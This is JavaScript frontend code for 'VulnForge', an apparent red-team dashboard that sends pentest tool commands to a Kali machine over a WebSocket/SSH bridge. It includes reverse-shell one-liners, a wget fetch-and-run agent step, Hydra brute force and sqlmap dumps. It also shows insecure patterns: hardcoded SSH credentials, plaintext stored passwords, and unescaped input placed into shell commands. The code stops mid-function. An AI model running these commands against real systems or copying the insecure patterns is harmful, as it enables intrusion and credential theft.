/**
 * ============================================================
 *  VulnForge — Frontend Controller
 *  WebSocket · SSH · Arsenal · Reports · Script Builder
 * ============================================================
 */

let ws;

document.addEventListener('DOMContentLoaded', () => {

    // ============================================================
    //  REFERENCIAS DOM
    // ============================================================
    const output          = document.getElementById('terminal-output');
    const statusInd       = document.getElementById('status-indicator');
    const statusText      = document.getElementById('status-text');
    const connBadge       = document.getElementById('conn-badge');
    const connTitle       = document.getElementById('terminal-title');
    const cmdInput        = document.getElementById('cmd-input');
    const btnConnect      = document.getElementById('btn-connect');
    const btnDisconnect   = document.getElementById('btn-disconnect');
    const btnSend         = document.getElementById('btn-send');
    const targetInput     = document.getElementById('target-ip');
    const connSelector    = document.getElementById('conn-selector');
    const activeConn      = document.getElementById('active-conn-display');
    const connDot         = document.getElementById('conn-dot');
    const connLabel       = document.getElementById('conn-label');
    const scriptEditor    = document.getElementById('script-editor');
    const scriptName      = document.getElementById('script-name');
    const deployLog       = document.getElementById('deploy-log');
    const deployLogText   = document.getElementById('deploy-log-text');

    let activeConnectionId = null;
    let connections = [];

    // ============================================================
    //  REPORTS SYSTEM
    // ============================================================
    let reports = [];
    let currentToolRunning = null;   // tool ID currently being run
    let outputBuffer = '';           // accumulated output for parsing

    window.reports = reports; // expose for debugging

    function addReport(report) {
        report.id = Date.now();
        report.timestamp = new Date().toLocaleTimeString();
        reports.unshift(report); // newest first
        renderReports();
    }

    function renderReports() {
        const container = document.getElementById('reports-container');
        const count     = document.getElementById('report-count');
        if (!container) return;

        const btnExport = document.getElementById('btn-export-reports');
        if (reports.length === 0) {
            container.innerHTML = `
                <div class="report-empty">
                    <div class="icon">📂</div>
                    <div>No reports yet</div>
                    <div class="text-[10px] mt-1 text-gray-700">Run a scan from the Arsenal to see results here</div>
                </div>`;
            if (count) count.textContent = '(0)';
            if (btnExport) btnExport.disabled = true;
            return;
        }

        if (count) count.textContent = `(${reports.length})`;
        if (btnExport) btnExport.disabled = false;

        container.innerHTML = reports.map(r => {
            let bodyHtml = '';

            if (r.type === 'nmap') {
                bodyHtml = renderNmapReport(r);
            } else if (r.type === 'gobuster') {
                bodyHtml = renderGobusterReport(r);
            } else {
                bodyHtml = `<div class="text-[11px] text-gray-500 font-mono">${r.raw?.substring(0, 300) || 'No data'}</div>`;
            }

            const toolColor = r.type === 'nmap' ? 'text-violet-400' : r.type === 'gobuster' ? 'text-sky-400' : 'text-gray-400';

            return `
                <div class="report-card">
                    <div class="flex items-center justify-between mb-1.5">
                        <span class="text-[10px] font-semibold uppercase tracking-wider ${toolColor}">${r.type} › ${r.target}</span>
                        <span class="flex items-center gap-2">
                            <button onclick="exportScanReport(${reports.indexOf(r)}, 'md')"
                                class="text-[9px] text-gray-600 hover:text-neon transition-colors">⬇ .md</button>
                            <button onclick="exportScanReport(${reports.indexOf(r)}, 'html')"
                                class="text-[9px] text-gray-600 hover:text-cyber transition-colors">⬇ .html</button>
                            <button onclick="exportScanReport(${reports.indexOf(r)}, 'pdf')"
                                class="text-[9px] text-gray-600 hover:text-blood transition-colors">⬇ PDF</button>
                            <span class="text-[9px] text-gray-700">${r.timestamp}</span>
                        </span>
                    </div>
                    ${bodyHtml}
                </div>`;
        }).join('');
    }

    function renderNmapReport(r) {
        if (!r.ports || r.ports.length === 0) {
            return `<div class="text-[11px] text-gray-600">${r.raw?.substring(0, 400) || 'No open ports found'}</div>`;
        }
        let html = `<div class="text-[10px] text-gray-600 mb-1.5">Open ports: <span class="text-neon">${r.ports.length}</span></div>`;
        html += `<div class="flex flex-wrap gap-1.5">`;
        r.ports.forEach(p => {
            html += `<span class="port-badge">${p.port}/${p.protocol || 'tcp'}
                <span class="service-tag">${p.service || p.state || '?'}</span>
                ${p.version ? `<span class="text-[8px] text-gray-700 ml-1">${p.version}</span>` : ''}
            </span>`;
        });
        html += `</div>`;
        if (r.os) html += `<div class="text-[10px] text-gray-700 mt-1.5">OS: ${r.os}</div>`;
        return html;
    }

    function renderGobusterReport(r) {
        if (!r.dirs || r.dirs.length === 0) {
            return `<div class="text-[11px] text-gray-600">${r.raw?.substring(0, 400) || 'No directories found'}</div>`;
        }
        let html = `<div class="text-[10px] text-gray-600 mb-1.5">Found: <span class="text-neon">${r.dirs.length}</span> directories</div>`;
        html += `<div class="space-y-0.5">`;
        r.dirs.forEach(d => {
            const color = d.status < 300 ? 'text-neon' : d.status < 400 ? 'text-yellow-400' : 'text-gray-600';
            html += `<div class="text-[11px] font-mono">
                <span class="${color}">[${d.status}]</span>
                <span class="text-gray-400">${d.path}</span>
                ${d.size ? `<span class="text-gray-700 text-[9px]">(${d.size})</span>` : ''}
            </div>`;
        });
        html += `</div>`;
        return html;
    }

    function clearReports() {
        reports = [];
        renderReports();
        showToast('Reports cleared');
    }
    window.clearReports = clearReports;

    // ── Parse Nmap output ──
    function parseNmapOutput(text, target) {
        const report = { type: 'nmap', target, ports: [], os: '', raw: text };

        // Extract open ports
        const portRegex = /(\d+)\/(tcp|udp)\s+open\s+(\S+)(?:\s+(.+))?/gi;
        let match;
        while ((match = portRegex.exec(text)) !== null) {
            report.ports.push({
                port: match[1],
                protocol: match[2],
                state: 'open',
                service: match[3] || '?',
                version: (match[4] || '').trim()
            });
        }

        // Extract OS
        const osMatch = text.match(/OS details:\s*(.+)/i);
        if (osMatch) report.os = osMatch[1].trim();
        else {
            const osMatch2 = text.match(/Aggressive OS guesses:\s*(.+)/i);
            if (osMatch2) report.os = osMatch2[1].split(',')[0].trim();
        }

        if (report.ports.length > 0 || report.os) {
            addReport(report);
            showToast(`📊 Nmap report: ${report.ports.length} ports`);
        }
        return report;
    }

    // ── Parse Gobuster output ──
    function parseGobusterOutput(text, target) {
        const report = { type: 'gobuster', target, dirs: [], raw: text };

        const dirRegex = /(?:^|\n)\/(\S+)\s+\(Status:\s*(\d+)\)/g;
        let match;
        while ((match = dirRegex.exec(text)) !== null) {
            report.dirs.push({ path: '/' + match[1], status: parseInt(match[2]) });
        }

        // Alternative: "Found: /path (Status: 200) [Size: 123]"
        const dirRegex2 = /Found:\s+(\/\S+)\s+\(Status:\s*(\d+)\)/g;
        while ((match = dirRegex2.exec(text)) !== null) {
            // Avoid duplicates
            if (!report.dirs.some(d => d.path === match[1])) {
                report.dirs.push({ path: match[1], status: parseInt(match[2]) });
            }
        }

        if (report.dirs.length > 0) {
            addReport(report);
            showToast(`📊 Gobuster report: ${report.dirs.length} dirs`);
        }
        return report;
    }

    // ============================================================
    //  SALIDA EN TERMINAL
    // ============================================================
    window.appendOutput = function (text) {
        output.textContent += text + (text.endsWith('\n') ? '' : '\n');

        // Buffer for report parsing (collect up to 100KB)
        if (currentToolRunning) {
            outputBuffer += text + '\n';
            if (outputBuffer.length > 100000) {
                // Force parse if buffer gets too large
                finishToolOutput();
            }
        }

        requestAnimationFrame(() => {
            output.scrollTop = output.scrollHeight;
        });
    };

    // Called when we detect a tool has finished
    function finishToolOutput() {
        if (!currentToolRunning || !outputBuffer) return;
        const tool = currentToolRunning;
        const buf = outputBuffer;
        const target = targetInput.value.trim() || 'unknown';

        // Small delay to let the DOM settle
        setTimeout(() => {
            if (tool === 'nmap') parseNmapOutput(buf, target);
            else if (tool === 'gobuster') parseGobusterOutput(buf, target);
        }, 100);

        currentToolRunning = null;
        outputBuffer = '';
    }

    // ── Clear Terminal ──
    window.clearTerminal = function () {
        output.textContent = '';
        outputBuffer = '';
        currentToolRunning = null;
        showToast('✕ Terminal cleared');
    };

    // ── File Upload to Kali ──
    window.handleFileUpload = function (input) {
        const file = input.files && input.files[0];
        if (!file) return;
        const status = document.getElementById('file-upload-status');
        status.textContent = `📄 ${file.name} (${(file.size / 1024).toFixed(1)} KB)...`;

        const reader = new FileReader();
        reader.onload = function (e) {
            const content = e.target.result;
            const filename = file.name.replace(/[^a-zA-Z0-9._-]/g, '_');
            // Use heredoc with single-quoted delimiter so no escaping is needed
            const cmd = `cat > /tmp/${filename} << 'VULNFORGE_EOF'\n${content}\nVULNFORGE_EOF`;
            appendOutput(`\n▶ Uploading "${file.name}" to /tmp/${filename}...`);
            if (ws && ws.readyState === WebSocket.OPEN) {
                ws.send(cmd);
                status.textContent = `✅ ${file.name} uploaded to /tmp/`;
                showToast(`📁 Uploaded ${file.name} to Kali`);
            } else {
                // No SSH — just show in terminal
                appendOutput(`[!] Not connected to Kali. Content shown below:\n${'-'.repeat(40)}\n${content}\n${'-'.repeat(40)}`);
                status.textContent = `⚠️  Offline — shown in terminal`;
            }
            // Reset input so same file can be re-uploaded
            input.value = '';
        };
        reader.onerror = function () {
            status.textContent = '⚠️ Error reading file';
            input.value = '';
        };
        reader.readAsText(file);
    };

    window.appendBanner = function () {
        appendOutput('');
        appendOutput('  ██╗   ██╗██╗   ██╗██╗     ███╗   ██╗███████╗ ██████╗ ██████╗  ██████╗ ███████╗');
        appendOutput('  ██║   ██║██║   ██║██║     ████╗  ██║██╔════╝██╔═══██╗██╔══██╗██╔════╝ ██╔════╝');
        appendOutput('  ██║   ██║██║   ██║██║     ██╔██╗ ██║█████╗  ██║   ██║██████╔╝██║  ███╗█████╗  ');
        appendOutput('  ╚██╗ ██╔╝██║   ██║██║     ██║╚██╗██║██╔══╝  ██║   ██║██╔══██╗██║   ██║██╔══╝  ');
        appendOutput('   ╚████╔╝ ╚██████╔╝███████╗██║ ╚████║██║     ╚██████╔╝██║  ██║╚██████╔╝███████╗');
        appendOutput('    ╚═══╝   ╚═════╝ ╚══════╝╚═╝  ╚═══╝╚═╝      ╚═════╝ ╚═╝  ╚═╝ ╚═════╝ ╚══════╝');
        appendOutput('  ───────────────────────────────────────────────────────────────────────────────');
        appendOutput('  🌐 Red Team Dashboard  |  🔗 vulnforge.local  |  ⚡ 45 modules loaded');
        appendOutput('  ───────────────────────────────────────────────────────────────────────────────');
        appendOutput('');
    };

    // ============================================================
    //  CONNECTION MANAGER (localStorage)
    // ============================================================
    function loadConnections() {
        try {
            const stored = localStorage.getItem('vulnforge_connections');
            connections = stored ? JSON.parse(stored) : [];
        } catch {
            connections = [];
        }
        renderConnections();
    }

    function saveConnections() {
        localStorage.setItem('vulnforge_connections', JSON.stringify(connections));
        renderConnections();
    }

    function renderConnections() {
        connSelector.innerHTML = '<option value="">-- Select target --</option>';
        connections.forEach((c, i) => {
            const opt = document.createElement('option');
            opt.value = i;
            opt.textContent = `${c.name || 'Unknown'} (${c.ip})`;
            connSelector.appendChild(opt);
        });
        if (activeConnectionId !== null) {
            const exists = connections.some((_, i) => i === activeConnectionId);
            if (!exists) { activeConnectionId = null; hideActiveConn(); }
            else { showActiveConn(connections[activeConnectionId]); }
        }
    }

    function showActiveConn(conn) {
        activeConn.classList.remove('hidden');
        connDot.className = 'conn-dot ' + (ws && ws.readyState === WebSocket.OPEN ? 'online' : 'offline');
        connLabel.textContent = `${conn.name} (${conn.ip})`;
    }

    function hideActiveConn() {
        activeConn.classList.add('hidden');
    }

    window.showAddConnection = function () {
        document.getElementById('add-conn-form').classList.remove('hidden');
    };
    window.toggleAddConnection = function () {
        document.getElementById('add-conn-form').classList.add('hidden');
    };

    window.saveConnection = function () {
        const name = document.getElementById('new-conn-name').value.trim();
        const ip   = document.getElementById('new-conn-ip').value.trim();
        const user = document.getElementById('new-conn-user').value.trim();
        const pass = document.getElementById('new-conn-pass').value;
        if (!name || !ip || !user || !pass) {
            alert('⚠️  Fill in all fields: Alias, IP, User, Pass');
            return;
        }
        connections.push({ name, ip, user, pass });
        saveConnections();
        showToast(`✓ Connection "${name}" saved`);
        document.getElementById('new-conn-name').value = '';
        document.getElementById('new-conn-ip').value = '';
        document.getElementById('new-conn-user').value = '';
        document.getElementById('new-conn-pass').value = '';
        document.getElementById('add-conn-form').classList.add('hidden');
    };

    connSelector.addEventListener('change', () => {
        const idx = parseInt(connSelector.value);
        if (isNaN(idx)) return;
        activeConnectionId = idx;
        const conn = connections[idx];
        showActiveConn(conn);
        targetInput.value = conn.ip;
    });

    window.disconnectConn = function () {
        disconnectWS();
        activeConnectionId = null;
        hideActiveConn();
        connSelector.value = '';
    };

    // ============================================================
    //  WEBSOCKET — SSH
    // ============================================================
    function connectWS() {
        if (ws && ws.readyState === WebSocket.OPEN) {
            appendOutput('[!] Already connected.');
            return;
        }
        let sshIp = '192.168.214.142';
        let sshUser = 'javi';
        let sshPass = 'javi';
        if (activeConnectionId !== null) {
            const conn = connections[activeConnectionId];
            sshIp = conn.ip; sshUser = conn.user; sshPass = conn.pass;
            appendOutput(`[*] Connecting to ${conn.name} (${sshIp})...`);
        } else {
            appendOutput('[*] Connecting to Kali (default)...');
        }
        ws = new WebSocket('ws://localhost:8000/ws');

        ws.onopen = () => {
            statusInd.classList.replace('offline', 'online');
            statusText.textContent = 'ONLINE';
            statusText.classList.replace('text-gray-600', 'text-neon');
            if (activeConnectionId !== null) connDot.className = 'conn-dot online';
            connBadge.textContent = `connected: ${sshUser}@${sshIp}`;
            connTitle.textContent = `─╼ ${sshUser}@${sshIp} ╾─────────────────────────────────────`;
            ws.send(JSON.stringify({ type: 'auth', ip: sshIp, user: sshUser, pass: sshPass }));
        };

        ws.onmessage = (event) => {
            const data = event.data;

            // Handle JSON protocol messages
            if (typeof data === 'string' && data.startsWith('{') && data.includes('"type"')) {
                try {
                    const msg = JSON.parse(data);
                    if (msg.type === 'connected') {
                        appendOutput(`[+] ${msg.message || 'SSH connection established'}`);
                    } else if (msg.type === 'error') {
                        appendOutput(`[!] ${msg.message || 'Unknown error'}`);
                    }
                    return;
                } catch {}
            }

            // Check if this output signals tool completion (prompt pattern)
            if (currentToolRunning && data.includes('~$ ') && !data.includes('▶ ')) {
                // Tool probably finished — give it a moment then parse
                finishToolOutput();
            }

            appendOutput(data);
        };

        ws.onclose = () => {
            statusInd.classList.replace('online', 'offline');
            statusText.textContent = 'OFFLINE';
            statusText.classList.replace('text-neon', 'text-gray-600');
            connBadge.textContent = 'disconnected';
            connDot.className = 'conn-dot offline';
            appendOutput('\n[!] Connection closed.');
            ws = null;
        };
    }

    function disconnectWS() {
        if (ws && ws.readyState === WebSocket.OPEN) {
            appendOutput('[*] Closing connection...');
            ws.close();
        } else {
            appendOutput('[!] No active connection.');
        }
    }

    // ============================================================
    //  COMMAND SENDING
    // ============================================================
    window.sendCommand = function () {
        if (!ws || ws.readyState !== WebSocket.OPEN) {
            appendOutput('[!] Connect to Kali first.');
            return;
        }
        const cmd = cmdInput.value.trim();
        if (!cmd) return;
        ws.send(cmd);
        cmdInput.value = '';
    };

    window.sendPredefinedCmd = function (cmd) {
        if (!ws || ws.readyState !== WebSocket.OPEN) {
            appendOutput('[!] Connect to Kali first before launching modules.');
            return;
        }
        appendOutput(`\n▶ ${cmd}`);
        ws.send(cmd);
    };

    // ============================================================
    //  🔍 FILTER ARSENAL
    // ============================================================
    window.filterArsenal = function (query) {
        const q = query.toLowerCase().trim();
        const totalSpan = document.getElementById('arsenal-total-count');
        let visibleCount = 0;
        let totalCount = 0;

        document.querySelectorAll('.cat-header').forEach(header => {
            const body = header.nextElementSibling;
            if (!body || !body.classList.contains('cat-body')) return;
            const buttons = body.querySelectorAll('.tool-btn');
            let hasVisible = false;

            buttons.forEach(btn => {
                totalCount++;
                const text = btn.textContent.toLowerCase();
                if (!q || text.includes(q)) {
                    btn.style.display = '';
                    hasVisible = true;
                    visibleCount++;
                } else {
                    btn.style.display = 'none';
                }
            });

            // Show category if it has visible tools
            if (hasVisible) {
                header.style.display = '';
                body.style.display = '';
            } else {
                header.style.display = q ? 'none' : '';
                body.style.display = q ? 'none' : '';
            }
        });

        if (totalSpan) {
            totalSpan.textContent = q ? `[${visibleCount}/${totalCount}]` : `[${totalCount}]`;
        }
    };

    // ============================================================
    //  🚀 LAUNCH TOOL
    // ============================================================
    // ── Extra flags examples per tool ──
    const toolExamples = {
        gobuster: '-w /usr/share/wordlists/dirbuster/directory-list-lowercase-2.3-small.txt -x php,html,txt',
        dirb: '-w /usr/share/wordlists/dirb/big.txt -X .php,.html',
        wfuzz: '-w /usr/share/wfuzz/wordlist/general/common.txt --hc 403,500',
        ffuf: '-w /usr/share/seclists/Discovery/Web-Content/raft-small-directories.txt -recursion',
        feroxbuster: '-x php,html -L 3 --filter-status 401,403',
        nikto: '-ssl -port 443 -Format html -o /tmp/nikto.html',
        whatweb: '-a 3 --log-verbose /tmp/whatweb.log',
        wpscan: '--enumerate u,vp --plugins-detection aggressive',
        cewl: '-d 3 -m 6 -w /tmp/custom.txt -c',
        nmap: '-p 22,80,443,3306,8080 -sV -sC -Pn',
        masscan: '-p22,80,443 --rate=500 -oJ /tmp/masscan.json',
        netcat: '-zv 22 80 443 8080',
        dnsrecon: '-t rvl -D /usr/share/wordlists/dns/subdomains-top1mil-5000.txt',
        curl: '-k -L -A \"Mozilla/5.0\" -H \"X-Forwarded-For: 127.0.0.1\"',
        socat: 'TCP-LISTEN:4444,fork,reuseaddr -',
        enum4linux: '-U -S -G -P -r -R',
        smbclient: '-U guest -N -c ls',
        'evil-winrm': '-u <user> -p <pass> -s /opt/scripts',
        impacket: '-hashes :<ntlm_hash> -target-ip 10.10.10.10',
        smbmap: '-u <user> -p <pass> -d <domain> -R',
        ldapsearch: '-x -b \"dc=htb,dc=local\" \"(objectclass=user)\"',
        bloodhound: '-d htb.local -u <user> -p <pass> -c All',
        'nc-listener': '-lvnp 4444',
        'hydra-ssh': '-l <user> -P /usr/share/seclists/Passwords/Common-Credentials/10k-most-common.txt -t 8',
        'hydra-ftp': '-l admin -P /usr/share/wordlists/rockyou.txt -V -t 4',
        sqlmap: '--risk=3 --level=5 --dump-all --batch -D <dbname>',
        searchsploit: '-t <software> -w -o /tmp/exploits.txt',
    };

    window.clearExtraFlags = function () {
        document.getElementById('extra-flags').value = '';
        document.getElementById('extra-flags-example').classList.add('hidden');
        document.getElementById('extra-flags-hint').textContent = 'optional';
    };

    function updateExtraFlagsHint(tool) {
        const exampleText = document.getElementById('extra-flags-example-text');
        const exampleDiv = document.getElementById('extra-flags-example');
        const hint = document.getElementById('extra-flags-hint');
        const ex = toolExamples[tool];
        if (ex) {
            exampleText.textContent = ex;
            exampleDiv.classList.remove('hidden');
            hint.textContent = 'click tool for examples';
        } else {
            exampleDiv.classList.add('hidden');
            hint.textContent = 'optional';
        }
    }

    window.launchTool = function (tool) {
        const target = targetInput.value.trim();
        const extraFlags = document.getElementById('extra-flags').value.trim();
        const needsTarget = [
            'gobuster','dirb','wfuzz','ffuf','feroxbuster','nikto','whatweb','wpscan','cewl',
            'nmap','masscan','netcat','dnsrecon','curl','socat',
            'enum4linux','smbclient','smbmap','ldapsearch','bloodhound','evil-winrm','impacket',
            'hydra-ssh','hydra-ftp','sqlmap','responder','burpsuite'
        ];
        if (needsTarget.includes(tool) && !target) {
            alert('⚠️  Enter a target IP/domain in the "Target_" field first.');
            targetInput.focus();
            return;
        }

        let command = '';
        let description = '';

        switch (tool) {
            // ── Web Recon ──
            case 'gobuster':
                command = `gobuster dir -u http://${target} -w /usr/share/wordlists/dirb/common.txt -t 50 -q`;
                description = 'Gobuster — directory enumeration';
                break;
            case 'dirb':
                command = `dirb http://${target} /usr/share/wordlists/dirb/common.txt`;
                description = 'Dirb — directory brute force';
                break;
            case 'wfuzz':
                command = `wfuzz -c -w /usr/share/wordlists/dirb/common.txt --hc 404 http://${target}/FUZZ`;
                description = 'Wfuzz — web fuzzing';
                break;
            case 'ffuf':
                command = `ffuf -w /usr/share/wordlists/dirb/common.txt -u http://${target}/FUZZ`;
                description = 'Ffuf — fast web fuzzer';
                break;
            case 'feroxbuster':
                command = `feroxbuster -u http://${target} -w /usr/share/wordlists/dirb/common.txt -t 50 --depth 4 --quiet`;
                description = 'Feroxbuster — directory scan (Rust)';
                break;
            case 'nikto':
                command = `nikto -h http://${target}`;
                description = 'Nikto — web vulnerability scanner';
                break;
            case 'whatweb':
                command = `whatweb ${target}`;
                description = 'WhatWeb — technology fingerprinting';
                break;
            case 'wpscan':
                command = `wpscan --url http://${target} --no-update --disable-tls-checks`;
                description = 'Wpscan — WordPress scanner';
                break;
            case 'cewl':
                command = `cewl -d 2 -m 5 -w /tmp/cewl_${target}.txt http://${target} 2>/dev/null; echo "Wordlist saved: /tmp/cewl_${target}.txt"`;
                description = 'Cewl — custom wordlist generator';
                break;

            // ── Network ──
            case 'nmap':
                command = `nmap -p- -sV -sC -O -A --min-rate=1000 -T4 ${target}`;
                description = 'Nmap — aggressive full scan';
                break;
            case 'masscan':
                command = `masscan -p1-65535 --rate=1000 ${target}`;
                description = 'Masscan — mass port scan (65535)';
                break;
            case 'netcat':
                command = `nc -zv ${target} 21 22 23 25 53 80 110 139 143 443 445 993 995 1433 1521 2049 3306 3389 5432 5900 5985 5986 8080 8443`;
                description = 'Netcat — fast TCP scan (24 ports)';
                break;
            case 'dnsrecon':
                command = `dnsrecon -d ${target}`;
                description = 'Dnsrecon — DNS enumeration';
                break;
            case 'curl':
                command = `curl -s -I -L --user-agent "Mozilla/5.0" http://${target}`;
                description = 'Curl — HTTP headers + redirects';
                break;
            case 'socat':
                command = `echo "╔═ Socat Guide ═╗\n\n# Listen on port (reverse shell catch):\nsocat TCP-LISTEN:4444,fork,reuseaddr -\n\n# Connect back:\nsocat EXEC:/bin/sh TCP:${target}:4444\n\n# Port forward:\nsocat TCP-LISTEN:8080,fork TCP:${target}:80\n\n# SSL wrapper:\nsocat OPENSSL-LISTEN:443,cert=server.pem,fork TCP:localhost:80"`;
                description = 'Socat — TCP/UDP relay & shell';
                break;

            // ── SMB / Windows ──
            case 'enum4linux':
                command = `enum4linux -a ${target}`;
                description = 'Enum4linux — full SMB enumeration';
                break;
            case 'smbclient':
                command = `smbclient -L //${target} -N`;
                description = 'Smbclient — list SMB shares (null session)';
                break;
            case 'evil-winrm':
                command = `echo "Usage:\nevil-winrm -i ${target} -u <user> -p <pass>\nevil-winrm -i ${target} -u <user> -H <hash>\n\n# With kerberos:\nevil-winrm -i ${target} -r <domain> -u <user>@<domain> -p <pass>"`;
                description = 'Evil-WinRM — WinRM shell';
                break;
            case 'impacket':
                command = `echo "╔═ Impacket Suite ═╗\n\npsexec.py <dom>/<user>:<pass>@${target}\nsmbexec.py <dom>/<user>:<pass>@${target}\nwmiexec.py <dom>/<user>:<pass>@${target}\n\n# Pass-the-hash\npsexec.py <dom>/<user>@${target} -hashes LM:NTLM"`;
                description = 'Impacket — psexec/smbexec/wmiexec';
                break;
            case 'smbmap':
                command = `smbmap -H ${target} -u '' -p '' -r . 2>/dev/null || smbmap -H ${target} -u 'guest' -p '' -r .`;
                description = 'Smbmap — SMB share permissions';
                break;
            case 'ldapsearch':
                command = `echo "# LDAP anonymous bind example:\nldapsearch -x -H ldap://${target} -b \"dc=htb,dc=local\" -s sub \"(objectclass=*)\" 2>&1 | head -100\n\n# With creds:\nldapsearch -x -H ldap://${target} -D \"cn=<user>,dc=htb,dc=local\" -w <pass> -b \"dc=htb,dc=local\" -s sub \"(objectclass=*)\""`;
                description = 'Ldapsearch — LDAP enumeration';
                break;
            case 'bloodhound':
                command = `echo "╔═ BloodHound Ingestor ═╗\n\n# Run from Kali (authenticated):\nbloodhound-python -d <domain> -u <user> -p <pass> -ns ${target} -c All\n\n# Run from Kali (with LDAP):\nbloodhound-python -d <domain> -u <user> -p <pass> -dc ${target} -c All\n\n# Output .json files can be imported to BloodHound GUI"`;
                description = 'BloodHound — AD ingestor (python)';
                break;

            // ── Pivoting ──
            case 'ligolo':
                command = `echo "╔════════════════════════════════════════╗\n║  Ligolo-ng — Pivot Tunneling Guide    ║\n╚════════════════════════════════════════╝\n\n[Kali] sudo ip tuntap add user \$(whoami) mode tun ligolo\n[Kali] sudo ip link set ligolo up\n[Kali] ligolo-ng proxy -selfcert\n\n[Target] wget http://${target}:8000/agent -O /tmp/agent && chmod +x /tmp/agent && /tmp/agent\n[Target] ligolo-ng agent -connect ${target}:11601 -ignore-cert\n\n[Proxy] sudo ip route add <subnet>/24 dev ligolo\n[Proxy] session > start"`;
                description = 'Ligolo-ng — pivot agent guide';
                break;
            case 'nc-listener':
                command = `echo "╔════════════════════════════════════════╗\n║  Netcat Listener — Reverse Shell      ║\n╚════════════════════════════════════════╝\n\n[Kali] rlwrap nc -lvnp 4444\n\n[Target Bash] bash -i >& /dev/tcp/${target}/4444 0>&1\n[Target NC] nc -e /bin/sh ${target} 4444\n\n⚠️  Run the listener in a separate terminal."`;
                description = 'NC Listener — reverse shell guide';
                break;
            case 'chisel-client':
                command = `echo "╔═ Chisel Tunnel ═╗\n\n# Server (your Kali):\nchisel server -p 8000 --reverse\n\n# Client (target):\nchisel client ${target}:8000 R:8080:localhost:3000\n\n# Socks proxy:\nchisel client ${target}:8000 R:1080:socks"`;
                description = 'Chisel Client — TCP tunnel guide';
                break;
            case 'proxychains':
                command = `echo "╔═ Proxychains Guide ═╗\n\n# 1. Edit /etc/proxychains4.conf:\n#    socks4 127.0.0.1 9050\n#    http   127.0.0.1 8080\n\n# 2. Start your proxy (e.g. chisel, ssh -D):\nssh -D 9050 user@${target}\n\n# 3. Run through proxy:\nproxychains nmap -sT -Pn 10.0.0.1\nproxychains smbclient -L //10.0.0.2\nproxychains curl http://10.0.0.3:80"`;
                description = 'Proxychains — proxy chain guide';
                break;

            // ── Crypto / Decode ──
            case 'jwt-decode': {
                const token = prompt('🔑 Paste your JWT token:');
                if (!token) return;
                command = `echo "${token}" | cut -d. -f2 2>/dev/null | base64 -d 2>/dev/null | python3 -m json.tool 2>/dev/null || echo "Invalid JWT"`;
                description = 'JWT Decode — token payload';
                break;
            }
            case 'b64-encode': {
                const text = prompt('📝 Text to encode (Base64):');
                if (!text) return;
                command = `echo -n "${text}" | base64 -w0`;
                description = 'Base64 Encode';
                break;
            }
            case 'b64-decode': {
                const b64 = prompt('🔐 Base64 string to decode:');
                if (!b64) return;
                command = `echo "${b64}" | base64 -d 2>/dev/null || echo "Invalid Base64"`;
                description = 'Base64 Decode';
                break;
            }
            case 'john': {
                const hashType = prompt('🔑 Hash mode:\n> Leave empty for auto-detect:', '');
                const mode = hashType.trim() ? `--format=${hashType.trim()}` : '';
                command = `echo "John guide: ${mode || 'auto'}"`;
                description = 'John — hash cracker guide';
                break;
            }
            case 'hashcat': {
                const hcMode = prompt('⚡ Hashcat mode (default 0=MD5):', '0');
                command = `echo "Hashcat mode ${hcMode || 0}"`;
                description = 'Hashcat — GPU hash cracker guide';
                break;
            }

            // ── Exploitation ──
            case 'hydra-ssh':
                command = `hydra -l root -P /usr/share/wordlists/rockyou.txt ssh://${target} -t 4`;
                description = 'Hydra SSH — brute force (rockyou)';
                break;
            case 'hydra-ftp':
                command = `hydra -l admin -P /usr/share/wordlists/rockyou.txt ftp://${target} -t 4`;
                description = 'Hydra FTP — brute force (rockyou)';
                break;
            case 'sqlmap':
                command = `sqlmap -u http://${target} --batch --random-agent`;
                description = 'Sqlmap — automatic SQL injection';
                break;
            case 'searchsploit':
                command = `searchsploit ${target} 2>/dev/null || echo "[!] No results for: ${target}"`;
                description = 'Searchsploit — exploit search';
                break;
            case 'responder':
                command = `echo "╔═ Responder Guide ═╗\n\n# Start LLMNR/NBT-NS poisoner:\nsudo responder -I eth0 -dwv\n\n# To capture hashes on the network:\n# Target will try to resolve a non-existent host\n# Hashes captured in /usr/share/responder/logs/\n\n# Crack with john:\nsudo john /usr/share/responder/logs/*.txt --wordlist=/usr/share/wordlists/rockyou.txt"`;
                description = 'Responder — LLMNR/NBT-NS poisoning';
                break;
            case 'burpsuite':
                command = `echo "╔═ BurpSuite ═╗\n\n# 1. Launch BurpSuite GUI in Kali:\nburpsuite 2>/dev/null &\n\n# 2. Or from CLI:\njava -jar /opt/burpsuite.jar --collaborator-server 2>/dev/null &\n\n# 3. Proxy config:\n# Browser → 127.0.0.1:8080\n# CA cert → http://burpsuite\n\n# 4. REST API (headless):\njava -jar /opt/burpsuite.jar --project-file=/tmp/project --collaborator-server --config-file=/tmp/config.json 2>/dev/null &\n\n⚠️  BurpSuite runs in Kali GUI session. Use SSH -X if needed."`;
                description = 'BurpSuite — launch & proxy guide';
                break;

            // ── Extract / Compress ──
            case 'unzip':
                command = 'echo "Usage:\nunzip file.zip -d output_dir\nunzip -l file.zip       # list contents\nunzip -p file.zip | cat  # pipe to stdout"';
                description = 'Unzip — extract .zip archives';
                break;
            case 'tar-gz':
                command = 'echo "Usage:\ntar -xzvf archive.tar.gz\ntar -xzvf archive.tgz\ntar -czvf archive.tar.gz /path/to/dir   # create"';
                description = 'Tar.gz — extract .tar.gz / .tgz';
                break;
            case 'tar-xz':
                command = 'echo "Usage:\ntar -xJvf archive.tar.xz\ntar -cJvf archive.tar.xz /path/to/dir   # create"';
                description = 'Tar.xz — extract .tar.xz';
                break;
            case '7z-extract':
                command = 'echo "Usage:\n7z x file.7z\n7z l file.7z        # list contents\n7z a archive.7z /path   # create archive"';
                description = '7z — extract .7z archives';
                break;
            case 'unrar':
                command = 'echo "Usage:\nunrar x file.rar     # extract with full path\nunrar e file.rar     # extract without paths\nunrar l file.rar     # list contents"';
                description = 'Unrar — extract .rar archives';
                break;
            case 'gunzip':
                command = 'echo "Usage:\ngunzip file.gz\ngunzip -k file.gz   # keep original\ngzip -d file.gz     # same as gunzip"';
                description = 'Gunzip — decompress .gz files';
                break;
            case 'bunzip2':
                command = 'echo "Usage:\nbunzip2 file.bz2\nbunzip2 -k file.bz2  # keep original\nbzip2 -d file.bz2   # same as bunzip2"';
                description = 'Bunzip2 — decompress .bz2 files';
                break;

            default:
                appendOutput(`[!] Unknown tool: "${tool}"`);
                return;
        }

        // Set current tool for report parsing
        if (['nmap', 'gobuster'].includes(tool)) {
            currentToolRunning = tool;
            outputBuffer = '';
        }

        // Append extra flags if provided
        let finalCommand = command;
